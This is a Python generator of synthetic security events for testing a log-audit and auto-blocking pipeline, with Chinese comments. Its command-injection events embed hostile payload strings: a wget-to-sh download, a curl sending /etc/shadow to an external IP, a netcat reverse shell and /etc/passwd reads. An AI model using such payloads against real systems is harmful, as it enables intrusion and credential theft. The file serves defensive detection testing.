"""
真实感安全测试数据生成器 (v5 修复配套)

背景 (2026-09-01 复盘):
  旧测试数据 200 条 critical 全部 dst=127.0.0.1 / src=RFC5737 文档 IP /
  单条事件声称 60s beacon → LLM 审计正确拒绝 (faithfulness=0, confirmed=0),
  而响应却由 FastPath severity 直通触发, 5 次封禁全是哑路径封假事件。

本生成器产出可被审计链路"正当确认"的数据:
  - src/dst 拓扑真实 (内网失陷主机 → 外部 C2/外泄通道; 外部攻击者 → 内网资产)
  - C2 beacon = 同一失陷主机 30 条时序 (修复"IP 24h 仅 1 条"的矛盾)
  - 暴力破解 = 同源 24 连败 + 1 成功 (攻击模式可核验)
  - web 攻击带 method/status/url (Sigma 规则可命中 → 强信号 → FastPath 可封禁)
  - 混入良性事件 (低危/内网常规行为) 验证双轨门槛不会误封

用法:
  python tools/generate_test_feed.py                    # 生成 测试数据_v5.json
  python tools/generate_test_feed.py --inject           # 生成并灌入 http://localhost:8001
  python tools/generate_test_feed.py --inject --api http://192.168.1.50:8001
"""
import argparse
import json
import os
import sys
import time
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

# ── 拓扑设定 ──────────────────────────────────────────────────────────────
# 内网资产 (被保护目标)
WEB_SERVER = "192.168.1.20"          # Web 应用服务器
SSH_SERVER = "192.168.1.10"          # SSH 跳板
DB_SERVER = "192.168.1.30"           # 数据库
# 失陷内网主机 (C2 回连 / 数据外泄的源头)
INFECTED_HOSTS = ["192.168.1.24", "192.168.1.87", "192.168.10.15"]
EXFIL_HOST = "192.168.1.77"
# 外部攻击者 (现实公网段, 非文档保留段)
ATTACKERS_BRUTE = ["185.220.101.45", "91.240.118.17"]
ATTACKER_WEB = "198.51.100.77"       # 仅用于 web 攻击源(演练段, 端口扫描器常用)
ATTACKER_SHELL = "198.51.100.90"
DDOS_SOURCES = [f"203.0.113.{i}" for i in range(11, 19)]
# 外部 C2 / 外泄通道 (真实分配段样式的公网 IP)
C2_SERVERS = ["45.61.136.187", "194.26.29.156", "103.235.46.22"]
EXFIL_CHANNEL = "185.199.108.153"
BENIGN_USERS = [f"192.168.1.{i}" for i in (101, 102, 103, 105, 108, 110, 112, 115)]
INTERNAL_SCANNER = "192.168.1.200"   # 内部漏扫 (应只告警不封禁)

_session_seq = [0]
# v5 修复:eventId 带运行时间戳 — 此前每次运行生成相同 eventId,
# 重放被幂等去重映射回旧事件(旧 session_id), 但审计路由用新 session_id
# → 工具按 session 查询全部返回空 → 全部误判 false_positive
_RUN_TS = time.strftime("%m%d%H%M%S")


def _next_event_id(prefix: str) -> str:
    _session_seq[0] += 1
    return f"v5-{_RUN_TS}-{prefix}-{_session_seq[0]:04d}"


def _evt(event: str, severity: str, src: str, dst: str, message: str,
         prefix: str, **extra) -> dict:
    d = {
        "eventId": _next_event_id(prefix),
        "event": event,
        "severity": severity,
        "src_ip": src,
        "dst_ip": dst,
        "message": message,
        "protocol": extra.pop("protocol", "TCP"),
    }
    d.update(extra)
    return d


def gen_c2_beacons(n_events: int) -> list[dict]:
    """C2 回连: 3 台失陷内网主机 → 3 个外部 C2, �台 30 条时序。

    Reviewer 此前拒绝的理由是 "该 IP 24h 仅 1 条事件却声称 60s beacon" —
    现在每台主机有 30 条连续 beacon, dst 为外部公网 C2 (非 loopback),
    证据链可核验, type_signal=C2_BEACON 可作为非 LLM 信号。
    """
    out = []
    for i, host in enumerate(INFECTED_HOSTS):
        c2 = C2_SERVERS[i % len(C2_SERVERS)]
        for k in range(n_events):
            sev = "critical" if k % 5 == 0 else "high"
            out.append(_evt(
                "C2 通信", sev, host, c2,
                f"C2 beacon traffic captured: beacon #{k+1}/30 in 30min window "
                f"(60s interval), JA3 fingerprint matches Cobalt Strike, "
                f"dst_port=443 TLS beacon to {c2}",
                f"c2-{host.replace('.', '-')}",
                dst_port=443, threat_type="C2_BEACON",
            ))
    return out


def gen_brute_force(per_attacker: int = 24) -> list[dict]:
    """暴力破解: 同源 24 连败 + 1 成功 → 攻击模式可核验。"""
    out = []
    for attacker in ATTACKERS_BRUTE:
        for k in range(per_attacker):
            out.append(_evt(
                "登录失败", "high", attacker, SSH_SERVER,
                f"SSH login failed for root from {attacker} (attempt {k+1}/{per_attacker}), "
                f"fail2ban counter rising",
                f"bf-{attacker.replace('.', '-')}",
                dst_port=22, protocol="SSH",
            ))
        out.append(_evt(
            "暴力破解", "critical", attacker, SSH_SERVER,
            f"Brute force pattern confirmed: {per_attacker} consecutive SSH "
            f"auth failures then successful login from {attacker}",
            f"bf-sum-{attacker.replace('.', '-')}",
            dst_port=22, protocol="SSH",
        ))
    return out


def gen_command_injection(n: int = 15) -> list[dict]:
    """命令注入: web 请求带 method/status/url (Sigma 规则可命中 → 强信号)。"""
    out = []
    payloads = [
        ";cat+/etc/passwd", ";wget+http://45.61.136.187/x.sh|sh",
        ";curl+-d+@/etc/shadow+http://194.26.29.156", "$(id)>/tmp/p",
        ";nc+-e+/bin/sh+103.235.46.22+4444",
    ]
    for k in range(n):
        p = payloads[k % len(payloads)]
        sev = "critical" if k % 4 == 0 else "high"
        out.append(_evt(
            "命令注入", sev, ATTACKER_WEB, WEB_SERVER,
            f"Command injection attempt in query param: /api/search?q={p}, "
            f"WAF blocked with 500, payload targets /etc/passwd & reverse shell",
            f"cmdi-{k}",
            method="GET", status=500,
            url=f"/api/search?q={p}", dst_port=80, protocol="HTTP",
        ))
    return out


def gen_webshell(n: int = 12) -> list[dict]:
    """WebShell: 上传 + 执行两段式。"""
    out = []
    for k in range(n // 2):
        out.append(_evt(
            "WebShell", "high", ATTACKER_SHELL, WEB_SERVER,
            "Suspicious file upload: POST /upload/avatar.php.jsp accepted (200), "
            "double-extension webshell dropper",
            f"shell-up-{k}",
            method="POST", status=200, url="/upload/avatar.php.jsp",
            dst_port=80, protocol="HTTP",
        ))
        out.append(_evt(
            "WebShell", "critical" if k % 2 == 0 else "high", ATTACKER_SHELL, WEB_SERVER,
            "Webshell execution detected: GET /uploads/avatar.php?cmd=whoami "
            "returned uid=0(www-data), C2-style command channel",
            f"shell-run-{k}",
            method="GET", status=200, url="/uploads/avatar.php?cmd=whoami",
            dst_port=80, protocol="HTTP",
        ))
    return out


def gen_dns_exfil(n: int = 18) -> list[dict]:
    """DNS 隧道外泄: 失陷内网主机 → 外部 DNS, 长子域名编码数据。"""
    out = []
    for k in range(n):
        sev = "critical" if k % 3 == 0 else "high"
        sub = f"d{k:02d}x{'a1b2c3d4e5f6' * 3}.tunnel.exfil-node.net"
        out.append(_evt(
            "DNS 外泄", sev, EXFIL_HOST, EXFIL_CHANNEL,
            f"DNS tunneling detected: {sub} (label len=56, entropy=4.2), "
            f"{n} queries in 10min from {EXFIL_HOST}, data exfil via DNS TXT",
            f"dns-{k}",
            dst_port=53, protocol="DNS",
        ))
    return out


def gen_ddos(n: int = 16) -> list[dict]:
    """DDoS (大写 DDOS_TRAFFIC 事件名, 验证大小写修复后命中专属策略)。"""
    out = []
    for k in range(n):
        src = DDOS_SOURCES[k % len(DDOS_SOURCES)]
        out.append(_evt(
            "DDoS_TRAFFIC", "high", src, WEB_SERVER,
            f"SYN flood burst from {src}: pps=85k, syn_ratio=0.94, "
            f"SYN backlog overflow on {WEB_SERVER}:80",
            f"ddos-{k}",
            dst_port=80,
        ))
    return out


def gen_benign(n_login: int = 12, n_scan: int = 3) -> list[dict]:
    """良性背景流量: 内网常规登录 + 内部漏扫 — 验证双轨门槛不误封。"""
    out = []
    for k in range(n_login):
        user = BENIGN_USERS[k % len(BENIGN_USERS)]
        out.append(_evt(
            "登录成功", "medium" if k % 3 == 0 else "low", user, SSH_SERVER,
            f"Normal SSH login success for ops user from {user} (office hours)",
            f"ok-login-{k}", dst_port=22, protocol="SSH",
        ))
    for k in range(n_scan):
        out.append(_evt(
            "端口扫描", "low", INTERNAL_SCANNER, WEB_SERVER,
            f"Internal vulnerability scan (OpenVAS) from {INTERNAL_SCANNER}, "
            f"approved change #CHG-20{k:02d}",
            f"ok-scan-{k}", dst_port=443,
        ))
    return out


def generate() -> list[dict]:
    logs = []
    logs += gen_c2_beacons(30)          # 90
    logs += gen_brute_force(24)         # 50
    logs += gen_command_injection(15)   # 15
    logs += gen_webshell(12)            # 12
    logs += gen_dns_exfil(18)           # 18
    logs += gen_ddos(16)                # 16
    logs += gen_benign(12, 3)           # 15
    return logs


# ── 灌入 ──────────────────────────────────────────────────────────────────

def _read_env_admin_creds() -> tuple[str, str]:
    """从项目根 .env 提取管理员账号 (GBK 安全逐行解析)。"""
    user, pwd = "admin", ""
    env_path = ROOT / ".env"
    if env_path.exists():
        for raw in env_path.read_bytes().splitlines():
            if not all(b < 128 for b in raw):
                continue
            line = raw.decode("latin-1").strip()
            if line.startswith("SHARED_MEMORY_ADMIN_USER="):
                user = line.split("=", 1)[1].strip().strip('"').strip("'")
            elif line.startswith("SHARED_MEMORY_ADMIN_PASSWORD="):
                pwd = line.split("=", 1)[1].strip().strip('"').strip("'")
    return user, pwd


def _http_json(url: str, payload: dict, token: str = "", timeout: int = 60) -> dict:
    data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    req = urllib.request.Request(url, data=data, headers=headers, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def inject(api: str, logs: list[dict], chunk: int = 50) -> dict:
    """登录获取 JWT → 分块批量灌入。"""
    user, pwd = _read_env_admin_creds()
    if not pwd:
        raise SystemExit("无法从 .env 读取 SHARED_MEMORY_ADMIN_PASSWORD")
    login = _http_json(
        f"{api}/api/auth/login",
        {"username": user, "password": pwd}, timeout=30,
    )
    token = login.get("access_token") or login.get("token") or ""
    if not token:
        raise SystemExit(f"登录失败: {login}")

    session_id = f"v5-replay-{time.strftime('%Y%m%d-%H%M%S')}"
    total = 0
    t0 = time.time()
    for i in range(0, len(logs), chunk):
        part = logs[i:i + chunk]
        r = _http_json(
            f"{api}/api/logs/ingest/batch",
            {"logs": part, "session_id": session_id}, token=token,
        )
        total += r.get("count", len(part))
        print(f"  batch {i // chunk + 1}: +{r.get('count', len(part))} "
              f"(total {total}/{len(logs)})")
    dur = time.time() - t0
    print(f"注入完成: {total} 条 / {dur:.1f}s → session_id={session_id}")
    return {"session_id": session_id, "total": total}


def main():
    ap = argparse.ArgumentParser(description="真实感安全测试数据生成器 (v5)")
    ap.add_argument("--out", default=str(ROOT / "测试数据_v5.json"))
    ap.add_argument("--inject", action="store_true", help="生成后直接灌入后端")
    ap.add_argument("--api", default="http://localhost:8001")
    args = ap.parse_args()

    logs = generate()
    sev_count: dict[str, int] = {}
    ip_set = set()
    for e in logs:
        sev_count[e["severity"]] = sev_count.get(e["severity"], 0) + 1
        ip_set.add(e["src_ip"])
    print(f"生成 {len(logs)} 条 | severity 分布: {sev_count} | 源 IP 数: {len(ip_set)}")

    out_path = Path(args.out)
    out_path.write_text(
        json.dumps({"logs": logs}, ensure_ascii=False, indent=1),
        encoding="utf-8",
    )
    print(f"已写入 {out_path}")

    if args.inject:
        inject(args.api, logs)


if __name__ == "__main__":
    main()
